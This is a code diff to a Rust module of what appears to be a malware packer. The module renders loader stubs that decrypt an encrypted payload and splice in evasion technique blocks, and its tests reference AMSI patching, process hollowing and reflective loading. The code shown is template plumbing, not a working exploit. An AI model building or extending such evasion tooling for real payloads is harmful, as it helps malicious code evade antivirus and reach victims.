@@ -1,31 +1,71 @@
-//! Stub rendering from the template.
+//! Stub rendering from a template.
 //!
-//! The template (`templates/stub/main.rs.tpl`) is the generic skeleton: it
-//! contains `{{NAME}}`-style placeholders plus a `{{STUB_FRAGMENT}}` slot where
-//! the active techniques' fragments are injected. Each technique contributes
-//! its fragment through `PipelineStep::render_fragment` (see `techniques`).
-//! Any placeholder left unsubstituted (or missing from the template) is an
-//! error, to catch stale templates.
+//! Two template sources are supported:
+//!
+//! - The **builtin** template (`templates/stub/main.rs.tpl`), used when the
+//!   YAML has no `loader` block. It decrypts and runs the payload through the
+//!   active techniques.
+//! - A **custom** loader stub (a user-supplied `.rs` template referenced by
+//!   `loader.path`). It gets the same placeholders but is free to ignore the
+//!   preparation/execution blocks; the packer only requires it to define a
+//!   `fn main()`.
+//!
+//! Both are rendered by the same substitution engine: every `{{PLACEHOLDER}}`
+//! token in the template is replaced with a value built from [`StubParams`],
+//! the technique [`PipelineStep`]s and the [`StringsConfig`]. A token that is
+//! not a known placeholder (or a provided build arg) is an error, to catch
+//! stale templates.
+
+use std::collections::BTreeMap;
+use std::sync::OnceLock;
 
 use rand::RngCore;
+use regex::Regex;
 
-use super::obfuscation::StringsConfig;
+use super::obfuscation::{byte_array_literal, StringsConfig};
 use super::{BuildError, Result};
-use crate::techniques::PipelineStep;
+use crate::techniques::{Category, PipelineStep};
 
 /// Values used to fill the template placeholders.
 pub struct StubParams {
-    /// Nonce (24 bytes) in hex.
-    pub nonce_hex: String,
-    /// Key (32 bytes) in hex.
-    pub key_hex: String,
-    /// Original payload size.
+    /// XChaCha20 nonce (24 bytes), for `{{NONCE_HEX}}` / `{{PAYLOAD_NONCE_DEF}}`.
+    pub nonce: [u8; 24],
+    /// Symmetric key (32 bytes), for `{{KEY_HEX}}` / `{{PAYLOAD_KEY_DEF}}`.
+    pub key: [u8; 32],
+    /// Encrypted payload (ciphertext + tag), for `{{PAYLOAD_BYTES}}`.
+    pub ciphertext: Vec<u8>,
+    /// Original payload size, for `{{PLAINTEXT_LEN}}` / `{{PAYLOAD_LEN}}`.
     pub plaintext_len: usize,
     /// Per-build unique marker (e.g. `STUB_MARKER_<hex>`).
     pub stub_marker: String,
     /// Path to `payload.bin` for `include_bytes!` (relative to the stub).
     pub payload_path: String,
+    /// Positional build args, exposed to the template as `{{ARG_<index>}}`.
+    pub build_args: BTreeMap<String, String>,
 }
+
+/// The result of rendering a custom loader stub.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct RenderedStub {
+    /// The substituted Rust source.
+    pub source: String,
+    /// Non-fatal warnings (e.g. the stub ignores the technique blocks).
+    pub warnings: Vec<String>,
+}
+
+/// Placeholders the builtin template is required to contain (its contract).
+///
+/// A missing one means the builtin template is stale, so we fail loudly rather
+/// than emit a stub that will not compile or that silently does nothing.
+const BUILTIN_REQUIRED: &[&str] = &[
+    "{{NONCE_HEX}}",
+    "{{KEY_HEX}}",
+    "{{PLAINTEXT_LEN}}",
+    "{{STUB_MARKER_DEF}}",
+    "{{PAYLOAD_PATH}}",
+    "{{PREPARATION_BLOCKS}}",
+    "{{EXECUTION_BLOCK}}",
+];
 
 /// Generates a per-build unique marker: `STUB_MARKER_<16 hex>`.
 pub fn generate_stub_marker() -> String {
@@ -34,14 +74,12 @@ pub fn generate_stub_marker() -> String {
     format!("STUB_MARKER_{}", hex::encode(bytes))
 }
 
-/// Renders `template`, substituting every placeholder with `params` and
-/// injecting the active techniques' fragments (`pipeline`) into
+/// Renders the builtin stub template, substituting every placeholder with
+/// `params` and injecting the active techniques' fragments (`pipeline`) into
 /// `{{PREPARATION_BLOCKS}}` (Preparation techniques, in order) and
-/// `{{EXECUTION_BLOCK}}` (the single Execution technique). Every sensitive
-/// string literal (the marker, and any technique parameter) is obfuscated
-/// through `strings` and emitted as code that rebuilds it at runtime.
+/// `{{EXECUTION_BLOCK}}` (the single Execution technique).
 ///
-/// Returns an error if an expected placeholder is missing from the template or
+/// Returns an error if a required placeholder is missing from the template or
 /// if any `{{...}}` is left unsubstituted.
 pub fn render_main_rs(
     template: &str,
@@ -49,9 +87,126 @@ pub fn render_main_rs(
     pipeline: &[PipelineStep],
     strings: &StringsConfig,
 ) -> Result<String> {
-    use crate::techniques::Category;
+    for required in BUILTIN_REQUIRED {
+        if !template.contains(required) {
+            return Err(BuildError::InvalidTemplate(format!(
+                "placeholder '{required}' does not appear in the template"
+            )));
+        }
+    }
+    render_common(template, params, pipeline, strings)
+}
 
-    // Split the pipeline into Preparation fragments and the Execution fragment.
+/// Renders a custom loader stub template.
+///
+/// Unlike the builtin, the template may omit any placeholder; the only hard
+/// requirement (enforced separately by [`validate_custom_stub_template`]) is a
+/// `fn main()`. When the template ignores the technique blocks while the YAML
+/// declares techniques, a non-fatal warning is returned for each ignored block.
+pub fn render_custom_stub(
+    template: &str,
+    params: &StubParams,
+    pipeline: &[PipelineStep],
+    strings: &StringsConfig,
+) -> Result<RenderedStub> {
+    let mut warnings = Vec::new();
+    if has_preparation(pipeline) && !template.contains("{{PREPARATION_BLOCKS}}") {
+        warnings.push(
+            "loader stub does not reference {{PREPARATION_BLOCKS}}; declared \
+             preparation techniques will have no effect"
+                .to_string(),
+        );
+    }
+    if has_execution(pipeline) && !template.contains("{{EXECUTION_BLOCK}}") {
+        warnings.push(
+            "loader stub does not reference {{EXECUTION_BLOCK}}; the payload \
+             will not be executed"
+                .to_string(),
+        );
+    }
+
+    let source = render_common(template, params, pipeline, strings)?;
+    Ok(RenderedStub { source, warnings })
+}
+
+/// Validates a custom loader stub before compilation: it must define a
+/// `fn main()`. The check is deliberately simple (`fn\s+main\s*\(`) and does not
+/// attempt to parse Rust.
+pub fn validate_custom_stub_template(template: &str) -> Result<()> {
+    static MAIN_RE: OnceLock<Regex> = OnceLock::new();
+    let re = MAIN_RE.get_or_init(|| Regex::new(r"fn\s+main\s*\(").expect("static regex"));
+    if !re.is_match(template) {
+        return Err(BuildError::InvalidTemplate(
+            "loader stub must define a `fn main()`".to_string(),
+        ));
+    }
+    Ok(())
+}
+
+/// Renders any template by substituting every known placeholder token.
+fn render_common(
+    template: &str,
+    params: &StubParams,
+    pipeline: &[PipelineStep],
+    strings: &StringsConfig,
+) -> Result<String> {
+    let values = placeholder_values(template, params, pipeline, strings);
+    substitute_template(template, &values)
+}
+
+/// Builds the `{{PLACEHOLDER}} → value` map for a template.
+///
+/// The expensive `{{PAYLOAD_BYTES}}` array literal is only built when the
+/// template actually references it (the builtin uses `include_bytes!` instead).
+fn placeholder_values(
+    template: &str,
+    params: &StubParams,
+    pipeline: &[PipelineStep],
+    strings: &StringsConfig,
+) -> BTreeMap<String, String> {
+    let (preparation_blocks, execution_block) = render_blocks(pipeline, strings);
+    let stub_marker_def = strings
+        .obfuscate(&params.stub_marker)
+        .render_stub_expr("stub_marker");
+
+    let mut values = BTreeMap::new();
+    values.insert("{{NONCE_HEX}}".to_string(), hex::encode(params.nonce));
+    values.insert("{{KEY_HEX}}".to_string(), hex::encode(params.key));
+    values.insert(
+        "{{PLAINTEXT_LEN}}".to_string(),
+        params.plaintext_len.to_string(),
+    );
+    values.insert(
+        "{{PAYLOAD_LEN}}".to_string(),
+        params.plaintext_len.to_string(),
+    );
+    values.insert("{{STUB_MARKER_DEF}}".to_string(), stub_marker_def);
+    values.insert("{{PAYLOAD_PATH}}".to_string(), params.payload_path.clone());
+    values.insert(
+        "{{PAYLOAD_NONCE_DEF}}".to_string(),
+        byte_array_literal(&params.nonce),
+    );
+    values.insert(
+        "{{PAYLOAD_KEY_DEF}}".to_string(),
+        byte_array_literal(&params.key),
+    );
+    values.insert("{{PREPARATION_BLOCKS}}".to_string(), preparation_blocks);
+    values.insert("{{EXECUTION_BLOCK}}".to_string(), execution_block);
+    if template.contains("{{PAYLOAD_BYTES}}") {
+        values.insert(
+            "{{PAYLOAD_BYTES}}".to_string(),
+            byte_array_literal(&params.ciphertext),
+        );
+    }
+    for (name, value) in &params.build_args {
+        values.insert(format!("{{{{ARG_{name}}}}}"), value.clone());
+    }
+    values
+}
+
+/// Renders the technique blocks: Preparation fragments (each wrapped in a
+/// module, plus a `run_preparations` dispatcher) and the Execution fragment.
+fn render_blocks(pipeline: &[PipelineStep], strings: &StringsConfig) -> (String, String) {
     let mut preparation_blocks = String::new();
     let mut preparation_calls = String::new();
     let mut execution_block = String::new();
@@ -85,44 +240,52 @@ pub fn render_main_rs(
     preparation_blocks.push_str(&preparation_calls);
     preparation_blocks.push_str("    Ok(())\n}\n");
 
-    let stub_marker_def = strings
-        .obfuscate(&params.stub_marker)
-        .render_stub_expr("stub_marker");
+    (preparation_blocks, execution_block)
+}
 
-    let replacements: Vec<(&str, String)> = vec![
-        ("{{NONCE_HEX}}", params.nonce_hex.clone()),
-        ("{{KEY_HEX}}", params.key_hex.clone()),
-        ("{{PLAINTEXT_LEN}}", params.plaintext_len.to_string()),
-        ("{{STUB_MARKER_DEF}}", stub_marker_def),
-        ("{{PAYLOAD_PATH}}", params.payload_path.clone()),
-        ("{{PREPARATION_BLOCKS}}", preparation_blocks),
-        ("{{EXECUTION_BLOCK}}", execution_block),
-    ];
+/// Substitutes every `{{...}}` token in `template`, looking each one up in
+/// `values`. An unknown token (or an unterminated one) is an error.
+fn substitute_template(template: &str, values: &BTreeMap<String, String>) -> Result<String> {
+    let mut out = String::with_capacity(template.len());
+    let mut rest = template;
 
-    let mut rendered = template.to_string();
+    while let Some(start) = rest.find("{{") {
+        out.push_str(&rest[..start]);
 
-    for (placeholder, value) in &replacements {
-        if !rendered.contains(placeholder) {
-            return Err(BuildError::InvalidTemplate(format!(
-                "placeholder '{placeholder}' does not appear in the template"
-            )));
+        let after = &rest[start + 2..];
+        let end = after.find("}}").ok_or_else(|| {
+            BuildError::InvalidTemplate("the template contains an unterminated placeholder".into())
+        })?;
+
+        // Reconstruct the full `{{token}}` for the map lookup.
+        let full = &rest[start..start + 2 + end + 2];
+        match values.get(full) {
+            Some(value) => out.push_str(value),
+            None => {
+                return Err(BuildError::InvalidTemplate(format!(
+                    "the template contains an unsubstituted placeholder: '{full}'"
+                )));
+            }
         }
-        rendered = rendered.replace(placeholder, value);
+        rest = &after[end + 2..];
     }
 
-    // Detect unknown placeholders that were left unsubstituted.
-    if let Some(start) = rendered.find("{{") {
-        let end = rendered[start..]
-            .find("}}")
-            .map(|e| start + e + 2)
-            .unwrap_or(rendered.len());
-        let residual = &rendered[start..end];
-        return Err(BuildError::InvalidTemplate(format!(
-            "the template contains an unsubstituted placeholder: '{residual}'"
-        )));
-    }
+    out.push_str(rest);
+    Ok(out)
+}
 
-    Ok(rendered)
+/// Whether the pipeline declares at least one Preparation technique.
+fn has_preparation(pipeline: &[PipelineStep]) -> bool {
+    pipeline
+        .iter()
+        .any(|step| step.category() == Category::Preparation)
+}
+
+/// Whether the pipeline declares at least one Execution technique.
+fn has_execution(pipeline: &[PipelineStep]) -> bool {
+    pipeline
+        .iter()
+        .any(|step| step.category() == Category::Execution)
 }
 
 #[cfg(test)]
@@ -131,7 +294,7 @@ mod tests {
     use crate::engine::obfuscation::{StringStrategy, StringsConfig};
     use crate::techniques::process_hollowing::Params;
 
-    /// Minimal template with every generic placeholder.
+    /// Minimal template with every builtin placeholder.
     ///
     /// Deliberately does *not* define `dec_xor` (the real template does), so
     /// that the strategy tests below can assert on the substituted fragment
@@ -150,11 +313,13 @@ fn run() {
 
     fn params() -> StubParams {
         StubParams {
-            nonce_hex: "00".repeat(24),
-            key_hex: "11".repeat(32),
+            nonce: [0u8; 24],
+            key: [0x11u8; 32],
+            ciphertext: vec![],
             plaintext_len: 1234,
             stub_marker: "STUB_MARKER_deadbeef".to_string(),
             payload_path: "payload.bin".to_string(),
+            build_args: BTreeMap::new(),
         }
     }
 
@@ -290,5 +455,92 @@ fn run() {
         let err = render_main_rs(&tpl, &params(), &[], &xor_config()).expect_err("should fail");
         let msg = err.to_string();
         assert!(msg.contains("UNKNOWN"), "unclear error message: {msg}");
+    }
+
+    // --- custom loader stubs ---
+
+    fn custom_params() -> StubParams {
+        StubParams {
+            nonce: [0xABu8; 24],
+            key: [0xCDu8; 32],
+            ciphertext: vec![0x01, 0x02, 0x03],
+            plaintext_len: 7,
+            stub_marker: "STUB_MARKER_custom".to_string(),
+            payload_path: "payload.bin".to_string(),
+            build_args: BTreeMap::from([
+                ("0".to_string(), "abc".to_string()),
+                ("name".to_string(), "value".to_string()),
+            ]),
+        }
+    }
+
+    #[test]
+    fn custom_stub_substitutes_payload_bytes_and_len() {
+        let template = r#"fn main() { let p = {{PAYLOAD_BYTES}}; let l = {{PAYLOAD_LEN}}; }"#;
+        let rendered = render_custom_stub(template, &custom_params(), &[], &xor_config())
+            .expect("should render");
+        let src = rendered.source;
+
+        assert!(
+            src.contains("[0x01, 0x02, 0x03]"),
+            "payload bytes not substituted: {src}"
+        );
+        assert!(
+            src.contains("let l = 7"),
+            "payload len not substituted: {src}"
+        );
+        assert!(!src.contains("{{"), "no placeholders should remain: {src}");
+    }
+
+    #[test]
+    fn custom_stub_ignoring_preparation_blocks_warns() {
+        // The stub ignores both technique blocks; patch_amsi is Preparation.
+        let pipeline = vec![
+            PipelineStep::PatchAmsi(crate::techniques::patch_amsi::Params {}),
+            PipelineStep::ReflectiveLoading(crate::techniques::reflective_loading::Params {}),
+        ];
+        let template = "fn main() {}\n";
+        let rendered = render_custom_stub(template, &custom_params(), &pipeline, &xor_config())
+            .expect("should render");
+
+        assert_eq!(rendered.source, template, "no placeholders to substitute");
+        assert!(
+            rendered
+                .warnings
+                .iter()
+                .any(|w| w.contains("PREPARATION_BLOCKS")),
+            "expected a preparation-block warning: {:?}",
+            rendered.warnings
+        );
+    }
+
+    #[test]
+    fn custom_stub_substitutes_arg_placeholders() {
+        let template = "fn main() { let a = {{ARG_0}}; let b = {{ARG_name}}; }";
+        let rendered = render_custom_stub(template, &custom_params(), &[], &xor_config())
+            .expect("should render");
+        let src = rendered.source;
+
+        assert!(
+            src.contains("let a = abc"),
+            "positional arg not substituted: {src}"
+        );
+        assert!(
+            src.contains("let b = value"),
+            "named arg not substituted: {src}"
+        );
+        assert!(
+            !src.contains("{{ARG_"),
+            "arg placeholders should be gone: {src}"
+        );
+    }
+
+    #[test]
+    fn validate_custom_stub_requires_fn_main() {
+        assert!(validate_custom_stub_template("fn main() {}\n").is_ok());
+        assert!(validate_custom_stub_template("fn  main  ( ) {}\n").is_ok());
+
+        let err = validate_custom_stub_template("fn not_main() {}\n").expect_err("should fail");
+        assert!(err.to_string().contains("fn main"), "unclear error: {err}");
     }
 }
